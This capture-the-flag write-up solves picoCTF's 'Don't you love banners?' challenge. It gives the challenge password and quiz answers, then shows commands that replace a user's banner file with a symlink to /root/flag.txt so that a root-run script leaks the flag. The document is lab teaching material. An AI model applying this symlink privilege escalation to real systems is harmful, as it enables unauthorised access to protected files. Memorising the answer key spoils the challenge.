# Solution "Don't you love banners?"
This challenge practices exploiting symbolic link (symlink) vulnerabilities to escalate privileges. Read more about symlinks here: https://www.twingate.com/blog/glossary/symlink-attack

## Step 1: Connect to the Initial Port
Firstly, you need to connect to the port 63933 using this command: `nc tethys.picoctf.net 63933`. This connection will provide you with a password required for the next step: `My_Passw@rd_@1234`.

## Step 2: Connect to 50012
Using the password, connect to the next port (50012): `nc tethys.picoctf.net 50012`. Then you need to answer 2 questions:
```bash
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

## Step 3: Explore
Once authenticated, you will find yourself logged in as a user named player. Check the files in the current directory using `ls -lha`. You will find 2 files, focus on the banner file:
```bash
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
```

Then, navigate to the `root` directory using `cd /root`, and check the files:
```
player@challenge:/root$ ls -lha
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1.3K Feb  7  2024 script.py 
```

As you can see, as a user we cannot read, write or modify the flag file. Instead, focus on the `script.py`. You’ll find that it reads the banner file with root privileges. This is the critical insight: if we can make the banner file point to flag.txt, script.py will read the flag for us.

## Step 4: Symplink Vulnerability
To achieve this, create a symbolic link (symlink) pointing the banner file to flag.txt (do not forget to delete banner firstly!):
```bash
player@challenge:/root$ rm /home/player/banner  # Delete a banner file
player@challenge:/root$ ln -s /root/flag.txt /home/player/banner # Create a symlink
```

Finally, after setting up the symlink, exit the current session and reconnect to port 50012. You will find your flag!



